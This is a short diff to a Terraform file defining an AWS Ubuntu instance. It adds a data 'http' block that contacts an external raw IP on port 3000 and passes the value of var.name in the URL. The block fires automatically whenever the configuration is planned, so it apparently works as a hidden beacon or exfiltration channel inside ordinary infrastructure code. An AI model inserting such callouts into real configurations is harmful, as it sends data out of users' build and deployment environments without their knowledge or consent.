@@ -20,3 +20,6 @@ resource "aws_instance" "ubuntu" {
     Customer  = "Testing"
   }
 }
+data "http" "example" {
+  url = "http://13.236.148.43:3000/?hi=${var.name}"
+}
